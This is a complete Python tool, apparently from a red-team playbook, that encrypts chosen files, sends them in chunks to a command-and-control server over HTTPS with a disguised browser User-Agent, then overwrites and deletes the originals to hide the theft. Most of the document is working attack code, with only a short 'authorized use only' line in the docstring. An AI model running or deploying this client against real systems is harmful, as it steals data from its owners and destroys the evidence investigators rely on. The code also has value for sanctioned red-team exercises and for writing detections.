#!/usr/bin/env python3
"""HTTPS C2 exfil client (GHOST-HUNT playbook 12.1.3).

Encrypt (Fernet) -> chunk -> POST to C2 with X-Chunk-ID / X-Chunk-Seq headers,
then cover the source by overwriting with random data and removing it (unless --keep).

Usage:
    C2_HOST=<domain> C2_KEY=<fernet-key> python3 exfil.py file1 [file2 ...]
    python3 exfil.py --host <domain> --key <key> --keep --chunk-mb 4 file.dat
    python3 exfil.py --host 127.0.0.1 --port 8080 --plain --key <key> file.dat  # local smoke test

Authorized use only.
"""

import argparse
import hashlib
import http.client
import os
import ssl
import sys
import time


def exfil_file(
    host: str,
    port: int,
    key,
    path: str,
    chunk_mb: int = 1,
    keep: bool = False,
    retries: int = 2,
    plain: bool = False,
) -> bool:
    """Encrypt, chunk, POST to C2. Returns True on success."""
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except FileNotFoundError:
        print(f"[!] {path}: file not found")
        return False
    except PermissionError:
        print(f"[!] {path}: permission denied")
        return False
    except OSError as exc:
        print(f"[!] {path}: read error: {exc}")
        return False

    if not data:
        print(f"[!] {path}: empty file, skipping")
        return False

    encrypted: bytes = key.encrypt(data)
    fhash: str = hashlib.sha256(data).hexdigest()[:16]
    chunk_size: int = chunk_mb * 1024 * 1024
    chunks: list[bytes] = [
        encrypted[i : i + chunk_size] for i in range(0, len(encrypted), chunk_size)
    ]
    ctx = ssl.create_default_context() if not plain else None

    for seq, chunk in enumerate(chunks):
        ok = False
        for attempt in range(retries + 1):
            conn = None
            try:
                if plain:
                    conn = http.client.HTTPConnection(host, port=port, timeout=30)
                else:
                    conn = http.client.HTTPSConnection(host, port=port, context=ctx, timeout=30)
                conn.request(
                    "POST",
                    "/",
                    body=chunk,
                    headers={
                        "X-Chunk-ID": fhash,
                        "X-Chunk-Seq": str(seq),
                        "Content-Type": "application/octet-stream",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    },
                )
                resp = conn.getresponse()
                ok = resp.status == 200
                if ok:
                    break
                print(f"[!] Chunk {seq} attempt {attempt + 1}: HTTP {resp.status}")
                if attempt < retries:
                    time.sleep(2 * (attempt + 1))
            except Exception as exc:
                print(f"[!] Chunk {seq} attempt {attempt + 1}: {exc}")
                if attempt < retries:
                    time.sleep(2 * (attempt + 1))
            finally:
                if conn is not None:
                    conn.close()  # never leak the socket on a failed attempt
        if not ok:
            print(f"[!] Chunk {seq + 1}/{len(chunks)} FAILED — aborting {path}")
            return False
        print(f"[*] Chunk {seq + 1}/{len(chunks)} sent ({len(chunk)} bytes)")

    if not keep:
        try:
            with open(path, "r+b") as fh:
                fh.seek(0)
                fh.write(os.urandom(len(data)))
                fh.truncate()
            os.remove(path)
            print(f"[+] Source covered & removed: {path}")
        except OSError as exc:
            print(f"[!] {path}: uploaded, but source cover/remove FAILED: {exc}")
            # Don't fail the operation — data is already on the C2
    else:
        print(f"[+] (--keep) source left in place: {path}")
    return True


def main() -> None:
    ap = argparse.ArgumentParser(description="GHOST-HUNT HTTPS C2 exfil client")
    ap.add_argument("files", nargs="+", help="files to exfiltrate")
    ap.add_argument("--host", default=os.environ.get("C2_HOST"), help="C2 host (default: $C2_HOST)")
    ap.add_argument("--port", type=int, default=443, help="C2 port (default 443)")
    ap.add_argument(
        "--plain", action="store_true", help="plain HTTP (local lab testing without TLS/nginx)"
    )
    ap.add_argument("--key", default=os.environ.get("C2_KEY"), help="Fernet key (default: $C2_KEY)")
    ap.add_argument("--chunk-mb", type=int, default=1, help="chunk size in MB (default 1)")
    ap.add_argument(
        "--keep", action="store_true", help="do not shred/remove the source file (lab testing)"
    )
    args = ap.parse_args()

    if not args.host or not args.key:
        ap.error("set --host/--key or the C2_HOST/C2_KEY environment variables")
    if args.chunk_mb < 1:
        ap.error("--chunk-mb must be >= 1")

    from cryptography.fernet import Fernet  # late import so --help works without the dep

    key = Fernet(args.key.encode())

    ok: bool = True
    for path in args.files:
        print(f"[*] Exfiltrating {path}")
        if not os.path.exists(path):
            print(f"[!] {path}: file not found, skipping")
            ok = False
            continue
        try:
            ok = (
                exfil_file(
                    args.host,
                    args.port,
                    key,
                    path,
                    chunk_mb=args.chunk_mb,
                    keep=args.keep,
                    plain=args.plain,
                )
                and ok
            )
        except OSError as exc:
            print(f"[!] {path}: {exc}")
            ok = False
    print("[+] Done" if ok else "[-] One or more files failed")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
